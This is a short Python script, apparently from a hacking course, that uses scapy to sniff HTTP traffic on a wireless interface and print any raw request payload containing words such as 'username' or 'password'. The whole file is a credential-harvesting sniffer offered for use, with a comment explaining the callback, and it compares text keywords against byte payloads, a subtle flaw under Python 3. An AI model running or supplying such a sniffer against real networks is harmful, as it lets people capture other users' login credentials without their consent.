#! /usr/bin/python3
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)   #prn is the call back function i.e for each packet you sniff excute this function iface is the interface, store means we are saying to scapy that we dont want to store anything for me
                                                                           
def process_sniffed_packet(packet):
    if(packet.haslayer(http.HTTPRequest)):
        if(packet.haslayer(scapy.Raw)):
            load = packet[scapy.Raw].load
            keywords =  ["username","user","login","password","pass"]
            for keyword in keywords:
                if(keyword in load):
                    print(load)
                    break
        


sniff("wlp0s20f3")